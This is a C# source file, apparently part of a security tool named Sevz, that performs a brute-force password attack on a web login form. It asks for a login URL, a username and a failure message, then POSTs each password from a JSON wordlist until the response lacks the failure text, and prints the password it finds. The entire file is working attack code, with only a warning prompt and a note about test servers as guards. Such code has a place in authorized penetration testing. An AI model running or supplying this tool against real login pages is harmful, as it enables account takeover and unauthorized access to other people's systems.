using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Net.Http;
using Sevz.Services;
using Sevz.Models;
using static Sevz.Models.info;

namespace Sevz.Services
{
    public static class BruteforceAttack
    {
        public static async Task PerformBruteforceAttack(string[] args)
        {
            if (!info.AlertWarning())
            {
                return;
            }
            //if (!PasswordService.CheckPassword()) return;
            // 로그인 URL 입력 받기
            Console.Write("Enter the login URL (test server): ");
            string loginUrl = Console.ReadLine();

            // 사용자 이름 입력 받기
            Console.Write("Enter the username: ");
            string username = Console.ReadLine();

            // 실패 메시지를 입력 받음 로그인창 위에 출력되는 메시지로 판단
            Console.Write("Enter the failure message to look for (e.g., 'Invalid' or 'Login failed'): ");
            string failureMessage = Console.ReadLine();

            // 비밀번호 리스트가 들어있는 JSON 파일에서 비밀번호 불러오기
            List<string> passwordList = PasswordManager.LoadPasswords();

            if (passwordList == null || passwordList.Count == 0)
            {
                Console.WriteLine("No passwords found in the JSON file.");
                return;
            }

            // HttpClient 생성
            using (HttpClient client = new HttpClient())
            {
                foreach (string password in passwordList)
                {
                    // 로그인 폼 데이터 설정
                    var postData = new FormUrlEncodedContent(new[]
                    {
                        new KeyValuePair<string, string>("username", username),
                        new KeyValuePair<string, string>("password", password)
                    });

                    // POST 요청을 통해 로그인 시도
                    HttpResponseMessage response = await client.PostAsync(loginUrl, postData);
                    string resultContent = await response.Content.ReadAsStringAsync();

                    Console.WriteLine($"Trying password: {password}");

                    // 실패 메시지가 응답에 포함되면 실패로 간주
                    if (resultContent.Contains(failureMessage))
                    {
                        Console.WriteLine("Password incorrect.");
                    }
                    else
                    {
                        // 실패 메시지가 없으면 성공으로 간주
                        Console.WriteLine($"Password found: {password}");
                        break;
                    }
                }
            }
        }
    }
}
